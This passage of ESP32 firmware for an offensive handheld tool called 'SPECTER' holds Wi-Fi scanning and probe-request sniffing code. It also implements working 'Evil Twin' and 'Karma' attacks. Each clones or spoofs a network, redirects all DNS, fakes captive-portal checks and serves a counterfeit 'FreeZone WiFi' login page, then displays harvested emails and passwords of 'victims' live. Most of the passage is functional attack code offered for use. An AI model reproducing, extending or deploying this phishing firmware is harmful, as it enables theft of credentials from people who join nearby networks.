  return wifiSortSig ? wifiIdx[vi] : vi;
}
void doWiFiScan() {
  tft.fillRect(0, SCAN_LIST_TOP, 240, SCAN_BTN_TOP - SCAN_LIST_TOP, C_BG);
  tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(4, 60); tft.print("> initialising...");
  tft.setCursor(4, 73); tft.print("> station mode...");
  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(100);
  tft.setCursor(4, 86); tft.print("> scanning...");
  wifiCount = WiFi.scanNetworks(); wifiScroll = 0;
  if (wifiSortSig) sortBySignal();
  tft.setCursor(4, 99); tft.print("> found: "); tft.print(wifiCount); tft.print(" nets");
  delay(300); drawWiFiScanner();
}

// ============================================================
// WIFI DETAIL
// ============================================================
void drawWiFiDetail(int idx) {
  tft.fillScreen(C_BG); drawBar("SPECTER//WIFI", "DETAIL"); drawBack();
  String ssid = WiFi.SSID(idx); if (ssid.length() == 0) ssid = "(hidden)";
  int rssi = WiFi.RSSI(idx); int ch = WiFi.channel(idx);
  bool open = WiFi.encryptionType(idx) == WIFI_AUTH_OPEN;
  bool conf = hasConflict(idx); uint8_t* b = WiFi.BSSID(idx);
  uint16_t col = rssiToCol(rssi);
  drawHeader(17, "TARGET INFO");
  tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(0, 28); tft.print("> ssid:    "); tft.setTextColor(C_WHITE, C_BG); tft.print(ssid);
  tft.setTextColor(C_GREEN, C_BG); tft.setCursor(0, 41); tft.print("> bssid:   ");
  tft.setTextColor(C_YELLOW, C_BG);
  char mac[18]; sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X", b[0],b[1],b[2],b[3],b[4],b[5]);
  tft.print(mac);
  tft.setTextColor(C_GREEN, C_BG); tft.setCursor(0, 54); tft.print("> vendor:  ");
  tft.setTextColor(C_CYAN, C_BG); tft.print(getMfr(b));
  tft.setTextColor(C_GREEN, C_BG); tft.setCursor(0, 67); tft.print("> signal:  ");
  tft.setTextColor(col, C_BG); tft.print(rssi); tft.print(" dBm");
  drawBars(180, 65, rssiToBars(rssi), col);
  tft.setTextColor(C_GREEN, C_BG); tft.setCursor(0, 80); tft.print("> channel: ");
  tft.setTextColor(conf ? C_YELLOW : C_WHITE, C_BG); tft.print(ch);
  if (conf) { tft.setTextColor(C_YELLOW, C_BG); tft.print(" [!conflict]"); }
  tft.setTextColor(C_GREEN, C_BG); tft.setCursor(0, 93); tft.print("> band:    ");
  tft.setTextColor(C_WHITE, C_BG); tft.print(ch <= 13 ? "2.4 GHz" : "5 GHz");
  tft.setTextColor(C_GREEN, C_BG); tft.setCursor(0, 106); tft.print("> encrypt: ");
  tft.setTextColor(open ? C_GREEN : C_RED, C_BG); tft.print(open ? "OPEN" : "WPA2/WPA3");
  drawHR(119, C_DDGREEN); drawHeader(122, "THREAT ASSESSMENT");
  if (open) {
    tft.setTextColor(C_RED, C_BG); tft.setCursor(0, 133); tft.print("> [!!] OPEN NETWORK");
    tft.setCursor(0, 146); tft.print("> traffic unencrypted");
    tft.setTextColor(C_YELLOW, C_BG); tft.setCursor(0, 159); tft.print("> MITM attack possible");
  } else {
    tft.setTextColor(C_DGREEN, C_BG); tft.setCursor(0, 133); tft.print("> WPA2/WPA3 encrypted");
    tft.setCursor(0, 146); tft.print("> handshake capture possible");
    if (conf) { tft.setTextColor(C_YELLOW, C_BG); tft.setCursor(0, 159); tft.print("> [!] channel conflict"); }
    else { tft.setTextColor(C_DGREEN, C_BG); tft.setCursor(0, 159); tft.print("> no channel conflicts"); }
  }
  drawHR(175, C_DDGREEN);
  // Evil Twin button
  tft.fillRect(0, 178, 240, 50, C_DGREY);
  tft.drawRect(0, 178, 240, 50, C_RED); tft.fillRect(0, 178, 3, 50, C_RED);
  tft.setTextColor(C_RED, C_DGREY); tft.setTextSize(2);
  tft.setCursor(28, 196); tft.print("EVIL TWIN");
  tft.setTextColor(C_DGREEN, C_DGREY); tft.setTextSize(1);
  tft.setCursor(6, 216); tft.print("clone this network + captive portal");
}
bool wifiDetailEvilTwinTapped(uint16_t x, uint16_t y) { return (y >= 178 && y <= 228); }

// ============================================================
// PROBE SNIFFER
// ============================================================
void probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  uint16_t frameCtrl = payload[0] | (payload[1] << 8);
  if ((frameCtrl & 0x00FC) != 0x0040) return;
  uint8_t* src = &payload[10];
  if (pkt->rx_ctrl.sig_len < 28) return;
  uint8_t ssidLen = payload[25];
  if (ssidLen == 0 || ssidLen > 32) return;
  char macStr[18];
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", src[0],src[1],src[2],src[3],src[4],src[5]);
  char ssidStr[33]; memset(ssidStr, 0, 33); memcpy(ssidStr, &payload[26], ssidLen);
  for (int i = 0; i < probeCount; i++)
    if (strcmp(probeLog[i].mac, macStr) == 0 && strcmp(probeLog[i].ssid, ssidStr) == 0) return;
  int idx = probeCount < MAX_PROBES ? probeCount : MAX_PROBES - 1;
  if (probeCount >= MAX_PROBES) for (int i = 0; i < MAX_PROBES - 1; i++) probeLog[i] = probeLog[i+1];
  else probeCount++;
  strncpy(probeLog[idx].mac,  macStr,  17);
  strncpy(probeLog[idx].ssid, ssidStr, 32);
  probeLog[idx].rssi = pkt->rx_ctrl.rssi;
}

void drawProbeScreen(bool running) {
  tft.fillScreen(C_BG); drawBar("SPECTER//WIFI", "PROBE SNIFF");
  drawBack(); drawHeader(30, "PROBE SNIFFER");
  if (!running && probeCount == 0) {
    tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
    tft.setCursor(0, 42); tft.print("> passive — undetectable");
    tft.setCursor(0, 55); tft.print("> captures probe requests");
    tft.setCursor(0, 68); tft.print("> reveals known networks");
    drawHR(80, C_DDGREEN);
  } else {
    tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
    tft.setCursor(0, 30); tft.print("MAC        SSID          RSSI");
    drawHR(40, C_DDGREEN);
    int y = 44; int maxRows = 9;
    for (int i = probeScroll; i < probeCount && i < probeScroll + maxRows; i++) {
      uint16_t rowBg = (i % 2 == 0) ? C_DGREY : C_BG;
      tft.fillRect(0, y, 240, 18, rowBg); tft.fillRect(0, y, 3, 18, C_PURPLE);
      tft.setTextColor(C_YELLOW, rowBg); tft.setTextSize(1);
      tft.setCursor(4, y+3); tft.print(&probeLog[i].mac[9]);
      tft.setTextColor(C_WHITE, rowBg); tft.setCursor(70, y+3);
      char shortSsid[14]; strncpy(shortSsid, probeLog[i].ssid, 13); shortSsid[13] = 0;
      tft.print(shortSsid);
      tft.setTextColor(rssiToCol(probeLog[i].rssi), rowBg);
      tft.setCursor(200, y+3); tft.print(probeLog[i].rssi);
      y += 18;
    }
    if (probeCount > maxRows) {
      tft.setTextColor(C_DDGREEN, C_BG); tft.setTextSize(1); tft.setCursor(150, 230);
      tft.print(probeScroll+1); tft.print("-"); tft.print(min(probeScroll+maxRows, probeCount));
      tft.print("/"); tft.print(probeCount);
    }
  }
  drawHR(239, C_DGREEN); tft.fillRect(0, 240, 240, 80, C_DGREY);
  if (!running) {
    tft.drawRect(0, 240, 240, 80, C_PURPLE); tft.fillRect(0, 240, 3, 80, C_PURPLE);
    tft.setTextColor(C_PURPLE, C_DGREY); tft.setTextSize(2);
    tft.setCursor(probeCount > 0 ? 30 : 44, 264);
    tft.print(probeCount > 0 ? "SNIFF MORE" : "START SNIFF");
  } else {
    tft.drawRect(0, 240, 240, 80, C_YELLOW); tft.fillRect(0, 240, 3, 80, C_YELLOW);
    tft.setTextColor(C_YELLOW, C_DGREY); tft.setTextSize(2);
    tft.setCursor(44, 264); tft.print("STOP");
    tft.setTextColor(C_PURPLE, C_BG); tft.setTextSize(1);
    tft.setCursor(150, 220); tft.print("cap: "); tft.print(probeCount);
  }
}
bool probeBtnTapped(uint16_t x, uint16_t y)  { return (y >= 240); }
bool probeScrollUp(uint16_t x, uint16_t y)   { return (y >= 44 && y < 240 && x < 20 && probeCount > 0); }
bool probeScrollDown(uint16_t x, uint16_t y) { return (y >= 44 && y < 240 && x > 220 && probeCount > 0); }
void startProbeSniffer() {
  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(100);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&probeSnifferCallback);
  probeRunning = true;
}
void stopProbeSniffer() {
  esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_STA); probeRunning = false;
}

// ============================================================
// EVIL TWIN + CAPTIVE PORTAL
// ============================================================
const char* PORTAL_HTML = R"rawhtml(
<!DOCTYPE html><html><head><meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>FreeZone WiFi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:Arial,sans-serif;background:#f0f4f8;display:flex;align-items:center;justify-content:center;min-height:100vh;}
.card{background:#fff;border-radius:12px;padding:36px 28px;max-width:380px;width:90%;box-shadow:0 4px 24px rgba(0,0,0,0.10);}
.logo{text-align:center;margin-bottom:18px;}
.logo svg{width:48px;height:48px;}
h1{text-align:center;font-size:1.4em;color:#1a73e8;margin-bottom:4px;}
p{text-align:center;color:#666;font-size:0.92em;margin-bottom:22px;}
input{width:100%;padding:12px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:1em;margin-bottom:14px;outline:none;}
input:focus{border-color:#1a73e8;}
button{width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:1.05em;cursor:pointer;font-weight:600;}
button:hover{background:#1558b0;}
.footer{text-align:center;color:#aaa;font-size:0.78em;margin-top:18px;}
</style></head><body>
<div class='card'>
<div class='logo'>
<svg viewBox='0 0 48 48' fill='none' xmlns='http://www.w3.org/2000/svg'>
<circle cx='24' cy='24' r='24' fill='#1a73e8'/>
<path d='M14 26c2.8-2.8 6.6-4.5 10-4.5s7.2 1.7 10 4.5' stroke='#fff' stroke-width='2.5' stroke-linecap='round'/>
<path d='M10 22c4-4 9.5-6.5 14-6.5s10 2.5 14 6.5' stroke='#fff' stroke-width='2.5' stroke-linecap='round'/>
<circle cx='24' cy='31' r='2.5' fill='#fff'/>
</svg>
</div>
<h1>FreeZone WiFi</h1>
<p>Sign in to access free high-speed internet</p>
<form method='POST' action='/login'>
<input type='email' name='email' placeholder='Email address' required>
<input type='password' name='pass' placeholder='Password' required>
<button type='submit'>Connect to Internet</button>
</form>
<div class='footer'>By connecting you agree to our Terms of Service</div>
</div>
</body></html>
)rawhtml";

const char* SUCCESS_HTML = R"rawhtml(
<!DOCTYPE html><html><head><meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Connected</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f4f8;display:flex;align-items:center;justify-content:center;min-height:100vh;}
.card{background:#fff;border-radius:12px;padding:36px 28px;max-width:380px;width:90%;box-shadow:0 4px 24px rgba(0,0,0,0.10);text-align:center;}
h1{color:#34a853;font-size:1.4em;margin-bottom:10px;}
p{color:#666;font-size:0.95em;}
</style></head><body>
<div class='card'>
<h1>✓ Connected!</h1>
<p>You are now connected to FreeZone WiFi.<br>Enjoy your browsing.</p>
</div></body></html>
)rawhtml";

void drawEvilTwinScreen(bool running) {
  tft.fillScreen(C_BG);
  drawBar("SPECTER//WIFI", "EVIL TWIN");
  drawBack();
  drawHeader(30, "CAPTIVE PORTAL");

  if (!running) {
    // Show target info
    if (evilTwinTargetIdx >= 0) {
      String ssid = WiFi.SSID(evilTwinTargetIdx);
      if (ssid.length() == 0) ssid = "(hidden)";
      tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
      tft.setCursor(0, 42); tft.print("> target: ");
      tft.setTextColor(C_WHITE, C_BG); tft.print(ssid);
      tft.setTextColor(C_DGREEN, C_BG);
      tft.setCursor(0, 55); tft.print("> cloning SSID...");
      tft.setCursor(0, 68); tft.print("> serving fake login page");
      tft.setCursor(0, 81); tft.print("> creds show here live");
    } else {
      tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
      tft.setCursor(0, 42); tft.print("> broadcasting FREE_WIFI");
      tft.setCursor(0, 55); tft.print("> serving fake login page");
      tft.setCursor(0, 68); tft.print("> captured creds show below");
    }
    drawHR(95, C_DDGREEN);
    drawHeader(98, "CAPTURED CREDS");
    if (credCount == 0) {
      tft.setTextColor(C_DGREY, C_BG); tft.setTextSize(1);
      tft.setCursor(0, 112); tft.print("> waiting for victims...");
    } else {
      int y = 112;
      for (int i = credScroll; i < credCount && i < credScroll + 4; i++) {
        uint16_t bg = (i % 2 == 0) ? C_DGREY : C_BG;
        tft.fillRect(0, y, 240, 28, bg);
        tft.fillRect(0, y, 3, 28, C_RED);
        tft.setTextColor(C_YELLOW, bg); tft.setTextSize(1);
        char shortEmail[22]; strncpy(shortEmail, credLog[i].email, 21); shortEmail[21] = 0;
        tft.setCursor(6, y+4); tft.print(shortEmail);
        tft.setTextColor(C_GREEN, bg);
        char shortPass[22]; strncpy(shortPass, credLog[i].pass, 21); shortPass[21] = 0;
        tft.setCursor(6, y+16); tft.print("> "); tft.print(shortPass);
        y += 28;
      }
    }
    drawHR(239, C_DGREEN);
    tft.fillRect(0, 240, 240, 80, C_DGREY);
    tft.drawRect(0, 240, 240, 80, C_RED);
    tft.fillRect(0, 240, 3, 80, C_RED);
    tft.setTextColor(C_RED, C_DGREY); tft.setTextSize(2);
    tft.setCursor(48, 264); tft.print("LAUNCH");
  } else {
    // Running — show live creds
    tft.setTextColor(C_RED, C_BG); tft.setTextSize(1);
    tft.setCursor(0, 42); tft.print("> [ACTIVE] portal running");
    tft.setTextColor(C_DGREEN, C_BG);
    if (evilTwinTargetIdx >= 0) {
      String ssid = WiFi.SSID(evilTwinTargetIdx);
      if (ssid.length() == 0) ssid = "FREE_WIFI";
      tft.setCursor(0, 55); tft.print("> ssid: "); tft.print(ssid);
    } else {
      tft.setCursor(0, 55); tft.print("> ssid: FREE_WIFI");
    }
    tft.setCursor(0, 68); tft.print("> clients: auto-redirect");
    tft.setTextColor(C_YELLOW, C_BG);
    tft.setCursor(0, 81); tft.print("> creds: "); tft.print(credCount);
    drawHR(95, C_DDGREEN);
    drawHeader(98, "CAPTURED CREDS");
    if (credCount == 0) {
      tft.setTextColor(C_DGREY, C_BG); tft.setTextSize(1);
      tft.setCursor(0, 112); tft.print("> waiting for victims...");
    } else {
      int y = 112;
      for (int i = credScroll; i < credCount && i < credScroll + 4; i++) {
        uint16_t bg = (i % 2 == 0) ? C_DGREY : C_BG;
        tft.fillRect(0, y, 240, 28, bg);
        tft.fillRect(0, y, 3, 28, C_RED);
        tft.setTextColor(C_YELLOW, bg); tft.setTextSize(1);
        char shortEmail[22]; strncpy(shortEmail, credLog[i].email, 21); shortEmail[21] = 0;
        tft.setCursor(6, y+4); tft.print(shortEmail);
        tft.setTextColor(C_GREEN, bg);
        char shortPass[22]; strncpy(shortPass, credLog[i].pass, 21); shortPass[21] = 0;
        tft.setCursor(6, y+16); tft.print("> "); tft.print(shortPass);
        y += 28;
      }
    }
    drawHR(239, C_DGREEN);
    tft.fillRect(0, 240, 240, 80, C_DGREY);
    tft.drawRect(0, 240, 240, 80, C_YELLOW);
    tft.fillRect(0, 240, 3, 80, C_YELLOW);
    tft.setTextColor(C_YELLOW, C_DGREY); tft.setTextSize(2);
    tft.setCursor(60, 264); tft.print("STOP");
  }
}

bool evilTwinBtnTapped(uint16_t x, uint16_t y) { return (y >= 240); }

void stopEvilTwin() {
  evilTwinRunning = false;
  if (evilServer) { evilServer->stop(); delete evilServer; evilServer = nullptr; }
  if (evilDNS)    { evilDNS->stop();   delete evilDNS;    evilDNS    = nullptr; }
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
}

void runEvilTwin() {
  evilTwinRunning = true;
  credCount = 0; credScroll = 0;

  // Pick SSID — clone target or use FREE_WIFI
  String apSSID = "FREE_WIFI";
  if (evilTwinTargetIdx >= 0) {
    String s = WiFi.SSID(evilTwinTargetIdx);
    if (s.length() > 0) apSSID = s;
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(apSSID.c_str());
  delay(500);

  // DNS — redirect everything to our IP
  evilDNS = new DNSServer();
  evilDNS->start(53, "*", IPAddress(192,168,4,1));

  // Web server
  evilServer = new WebServer(80);

  evilServer->on("/", HTTP_GET, [&]() {
    evilServer->send(200, "text/html", PORTAL_HTML);
  });
  evilServer->on("/login", HTTP_POST, [&]() {
    String email = evilServer->arg("email");
    String pass  = evilServer->arg("pass");
    if (email.length() > 0 && credCount < MAX_CREDS) {
      strncpy(credLog[credCount].email, email.c_str(), 63);
      strncpy(credLog[credCount].pass,  pass.c_str(),  63);
      credCount++;
      // Refresh display with new cred
      drawEvilTwinScreen(true);
    }
    evilServer->send(200, "text/html", SUCCESS_HTML);
  });
  // Captive portal detection endpoints
  evilServer->onNotFound([&]() {
    evilServer->sendHeader("Location", "http://192.168.4.1/", true);
    evilServer->send(302, "text/plain", "");
  });

  evilServer->begin();
  drawEvilTwinScreen(true);

  // Main loop — handle requests until stopped
  while (evilTwinRunning) {
    evilDNS->processNextRequest();
    evilServer->handleClient();

    unsigned long now = millis();
    if (now - lastTouch >= DEBOUNCE_MS) {
      if (getTouch(tx, ty)) {
        lastTouch = now;
        if (backTapped(tx, ty) || evilTwinBtnTapped(tx, ty)) {
          stopEvilTwin();
          drawEvilTwinScreen(false);
          return;
        }
      }
    }
  }
}

// ============================================================
// KARMA ATTACK
// ============================================================

// iOS captive portal detection HTML — triggers native iOS WiFi password prompt
const char* KARMA_HTML = R"rawhtml(
<!DOCTYPE html><html><head><title>Success</title></head>
<body>Success</body></html>
)rawhtml";

// Apple captive portal check endpoints — return non-success to trigger iOS prompt
const char* KARMA_HOTSPOT_HTML = R"rawhtml(
<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>
)rawhtml";

void drawKarmaScreen(bool running) {
  tft.fillScreen(C_BG);
  drawBar("SPECTER//WIFI", "KARMA");
  drawBack();
  drawHeader(30, "KARMA ATTACK");

  tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
  if (!running) {
    tft.setCursor(0, 42); tft.print("> target: ");
    tft.setTextColor(C_ORANGE, C_BG); tft.print(KARMA_TARGET_SSID);
    tft.setTextColor(C_DGREEN, C_BG);
    tft.setCursor(0, 55); tft.print("> waits for probe requests");
    tft.setCursor(0, 68); tft.print("> auto-clones the target SSID");
    tft.setCursor(0, 81); tft.print("> iOS shows native pwd prompt");
    tft.setCursor(0, 94); tft.print("> password captured live");
  } else {
    tft.setTextColor(C_ORANGE, C_BG);
    tft.setCursor(0, 42); tft.print("> [ACTIVE] listening for probes");
    tft.setTextColor(C_DGREEN, C_BG);
    tft.setCursor(0, 55); tft.print("> ssid: ");
    tft.setTextColor(C_WHITE, C_BG); tft.print(KARMA_TARGET_SSID);
    tft.setTextColor(C_YELLOW, C_BG);
    tft.setCursor(0, 68); tft.print("> captures: "); tft.print(karmaCount);
  }

  drawHR(108, C_DDGREEN);
  drawHeader(111, "CAPTURED PASSWORDS");

  if (karmaCount == 0) {
    tft.setTextColor(C_DGREY, C_BG); tft.setTextSize(1);
    tft.setCursor(0, 125); tft.print("> waiting for iOS device...");
    tft.setCursor(0, 138); tft.print("> device must know target SSID");
  } else {
    int y = 125;
    for (int i = karmaScroll; i < karmaCount && i < karmaScroll + 4; i++) {
      uint16_t bg = (i % 2 == 0) ? C_DGREY : C_BG;
      tft.fillRect(0, y, 240, 26, bg);
      tft.fillRect(0, y, 3, 26, C_ORANGE);
      tft.setTextColor(C_YELLOW, bg); tft.setTextSize(1);
      char shortSSID[16]; strncpy(shortSSID, karmaLog[i].ssid, 15); shortSSID[15] = 0;
      tft.setCursor(6, y+4); tft.print(shortSSID);
      tft.setTextColor(C_WHITE, bg);
      tft.setCursor(6, y+15); tft.print("> "); tft.print(karmaLog[i].mac);
      y += 26;
    }
  }

  drawHR(239, C_DGREEN);
  tft.fillRect(0, 240, 240, 80, C_DGREY);
  if (!running) {
    tft.drawRect(0, 240, 240, 80, C_ORANGE);
    tft.fillRect(0, 240, 3, 80, C_ORANGE);
    tft.setTextColor(C_ORANGE, C_DGREY); tft.setTextSize(2);
    tft.setCursor(48, 264); tft.print("LAUNCH");
  } else {
    tft.drawRect(0, 240, 240, 80, C_YELLOW);
    tft.fillRect(0, 240, 3, 80, C_YELLOW);
    tft.setTextColor(C_YELLOW, C_DGREY); tft.setTextSize(2);
    tft.setCursor(60, 264); tft.print("STOP");
  }
}

bool karmaBtnTapped(uint16_t x, uint16_t y) { return (y >= 240); }

// Promiscuous callback — watches for probe requests for our target SSID
void karmaProbeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!karmaRunning) return;
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  uint16_t frameCtrl = payload[0] | (payload[1] << 8);
  if ((frameCtrl & 0x00FC) != 0x0040) return; // only probe requests
  if (pkt->rx_ctrl.sig_len < 28) return;
  uint8_t ssidLen = payload[25];
  if (ssidLen == 0 || ssidLen > 32) return;
  char ssidStr[33]; memset(ssidStr, 0, 33);
  memcpy(ssidStr, &payload[26], ssidLen);
  // Only respond to our target SSID
  if (strcmp(ssidStr, KARMA_TARGET_SSID) != 0) return;
  uint8_t* src = &payload[10];
  char macStr[18];
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", src[0],src[1],src[2],src[3],src[4],src[5]);
  // Log it if new
  for (int i = 0; i < karmaCount; i++)
    if (strcmp(karmaLog[i].mac, macStr) == 0) return;
  if (karmaCount < MAX_KARMA) {
    strncpy(karmaLog[karmaCount].ssid, ssidStr, 32);
    strncpy(karmaLog[karmaCount].mac,  macStr,  17);
    karmaLog[karmaCount].count = 1;
    karmaCount++;
  }
}

void stopKarma() {
  karmaRunning = false;
  esp_wifi_set_promiscuous(false);
  if (karmaServer) { karmaServer->stop(); delete karmaServer; karmaServer = nullptr; }
  if (karmaDNS)    { karmaDNS->stop();   delete karmaDNS;    karmaDNS    = nullptr; }
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
}

void runKarma() {
  karmaRunning = true;
  karmaCount = 0; karmaScroll = 0;

  // Start AP with target SSID — open network so iOS auto-connects
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(KARMA_TARGET_SSID); // open, no password
  delay(500);

  // DNS redirect
  karmaDNS = new DNSServer();
  karmaDNS->start(53, "*", IPAddress(192,168,4,1));

  // Web server — handle Apple captive portal detection
  karmaServer = new WebServer(80);

  // Apple hits these URLs to detect captive portals
  // Return non-standard response to trigger iOS "Sign in to network" prompt
  karmaServer->on("/hotspot-detect.html", HTTP_GET, [&]() {
    karmaServer->send(200, "text/html", "<HTML><HEAD><TITLE>Wi-Fi</TITLE></HEAD><BODY>Wi-Fi</BODY></HTML>");
  });
  karmaServer->on("/library/test/success.html", HTTP_GET, [&]() {
    karmaServer->send(200, "text/html", "<HTML><HEAD><TITLE>Wi-Fi</TITLE></HEAD><BODY>Wi-Fi</BODY></HTML>");
  });
  karmaServer->on("/success.txt", HTTP_GET, [&]() {
    karmaServer->send(200, "text/plain", "OFFLINE");
  });
  karmaServer->on("/generate_204", HTTP_GET, [&]() {
    karmaServer->send(200, "text/plain", "");
  });

  // Catch all — redirect to captive portal page showing password prompt context
  karmaServer->onNotFound([&]() {
    karmaServer->sendHeader("Location", "http://192.168.4.1/", true);
    karmaServer->send(302, "text/plain", "");
  });

  karmaServer->on("/", HTTP_GET, [&]() {
    karmaServer->send(200, "text/html", PORTAL_HTML);
  });

  karmaServer->on("/login", HTTP_POST, [&]() {
    String email = karmaServer->arg("email");
    String pass  = karmaServer->arg("pass");
    if (email.length() > 0 && karmaCount < MAX_KARMA) {
      // Store as karma entry reusing the struct — ssid = email, mac = pass
      strncpy(karmaLog[karmaCount].ssid, email.c_str(), 32);
      strncpy(karmaLog[karmaCount].mac,  pass.c_str(),  17);
      karmaCount++;
      drawKarmaScreen(true);
    }
    karmaServer->send(200, "text/html", SUCCESS_HTML);
  });

  karmaServer->begin();

  // Enable promiscuous to watch for probes
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&karmaProbeCallback);

  drawKarmaScreen(true);

  while (karmaRunning) {
    karmaDNS->processNextRequest();
    karmaServer->handleClient();
    unsigned long now = millis();
    if (now - lastTouch >= DEBOUNCE_MS) {
      if (getTouch(tx, ty)) {
        lastTouch = now;
        if (backTapped(tx, ty) || karmaBtnTapped(tx, ty)) {
          stopKarma();
          drawKarmaScreen(false);
          return;
        }
      }
    }
  }
}

// ============================================================
// BLE SCANNER
// ============================================================
class BLECallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    if (bleCount >= MAX_BLE) return;
    // Check for duplicate MAC
    String mac = dev.getAddress().toString().c_str();
    for (int i = 0; i < bleCount; i++)
      if (String(bleLog[i].mac) == mac) return;
    strncpy(bleLog[bleCount].mac, mac.c_str(), 17);
    if (dev.haveName()) strncpy(bleLog[bleCount].name, dev.getName().c_str(), 31);
    else strncpy(bleLog[bleCount].name, "(unknown)", 31);
    bleLog[bleCount].rssi = dev.getRSSI();
    // Detect Apple by manufacturer data starting with 0x004C
    bleLog[bleCount].isApple = false;
    if (dev.haveManufacturerData()) {
      std::string mfr = dev.getManufacturerData();
      if (mfr.length() >= 2 && (uint8_t)mfr[0] == 0x4C && (uint8_t)mfr[1] == 0x00)
        bleLog[bleCount].isApple = true;
    }
    bleCount++;
  }
};

void drawBLEScanner(bool scanning) {
  tft.fillScreen(C_BG); drawBar("SPECTER//BLE", "SCANNER");
  drawBack();
  tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(4, 20); tft.print("NAME             MAC        RSSI");
  drawHR(30, C_DDGREEN);

  if (bleCount == 0) {
    tft.setTextColor(C_DGREEN, C_BG);
    tft.setCursor(0, 80);  tft.print("> no devices found");
    tft.setCursor(0, 93);  tft.print("> press SCAN below");
    tft.setTextColor(C_DDGREEN, C_BG); tft.setCursor(0, 106); tft.print("> awaiting command_");
  } else {
    int y = 33;
    int maxRows = 10;
    for (int i = bleScroll; i < bleCount && i < bleScroll + maxRows; i++) {
      uint16_t rowBg = (i % 2 == 0) ? C_DGREY : C_BG;
      uint16_t nameCol = bleLog[i].isApple ? C_CYAN : C_WHITE;
      tft.fillRect(0, y, 240, 19, rowBg);
      tft.fillRect(0, y, 3, 19, bleLog[i].isApple ? C_CYAN : C_BLUE);
      tft.setTextColor(nameCol, rowBg); tft.setTextSize(1);
      char shortName[13]; strncpy(shortName, bleLog[i].name, 12); shortName[12] = 0;
      tft.setCursor(4, y+6); tft.print(shortName);
      tft.setTextColor(C_DGREEN, rowBg);
      tft.setCursor(100, y+6); tft.print(&bleLog[i].mac[9]);
      tft.setTextColor(rssiToCol(bleLog[i].rssi), rowBg);
      tft.setCursor(200, y+6); tft.print(bleLog[i].rssi);
      y += 19;
    }
    if (bleCount > 10) {
      tft.setTextColor(C_DDGREEN, C_BG); tft.setTextSize(1);
      tft.setCursor(150, SCAN_BTN_TOP - 10);
      tft.print(bleScroll+1); tft.print("-");
      tft.print(min(bleScroll+10, bleCount)); tft.print("/"); tft.print(bleCount);
    }
  }

  drawHR(SCAN_BTN_TOP - 1, C_DGREEN);
  tft.fillRect(0, SCAN_BTN_TOP, 240, 80, C_DGREY);
  if (!scanning) {
    tft.drawRect(0, SCAN_BTN_TOP, 240, 80, C_BLUE);
    tft.fillRect(0, SCAN_BTN_TOP, 3, 80, C_BLUE);
    tft.setTextColor(C_BLUE, C_DGREY); tft.setTextSize(3);
    tft.setCursor(60, SCAN_BTN_TOP+24); tft.print("SCAN");
  } else {
    tft.drawRect(0, SCAN_BTN_TOP, 240, 80, C_YELLOW);
    tft.fillRect(0, SCAN_BTN_TOP, 3, 80, C_YELLOW);
    tft.setTextColor(C_YELLOW, C_DGREY); tft.setTextSize(2);
    tft.setCursor(44, SCAN_BTN_TOP+28); tft.print("SCANNING...");
  }
}

bool bleScanBtnTapped(uint16_t x, uint16_t y)  { return (y >= SCAN_BTN_TOP); }
bool bleScanScrollUp(uint16_t x, uint16_t y)   { return (y >= 30 && y < SCAN_BTN_TOP && x < 20 && bleCount > 0); }
bool bleScanScrollDown(uint16_t x, uint16_t y) { return (y >= 30 && y < SCAN_BTN_TOP && x > 220 && bleCount > 0); }

void doBLEScan() {
  bleCount = 0; bleScroll = 0;
  drawBLEScanner(true);
  if (pBLEScan == nullptr) {
    BLEDevice::init("SPECTER");
    pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new BLECallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
  }
  pBLEScan->start(5, false); // 5 second scan
  pBLEScan->clearResults();
  drawBLEScanner(false);
}

// ============================================================
// BLE MENU
// ============================================================
void drawBLEMenu() {
  tft.fillScreen(C_BG); drawBar("SPECTER//BLE", "BLUETOOTH");
  drawBack(); drawHeader(30, "BLE MODULE");

  drawBtn(42, 60, "BLE SCANNER", C_BLUE, true);
  tft.setTextColor(C_DGREEN, C_DGREY); tft.setTextSize(1);
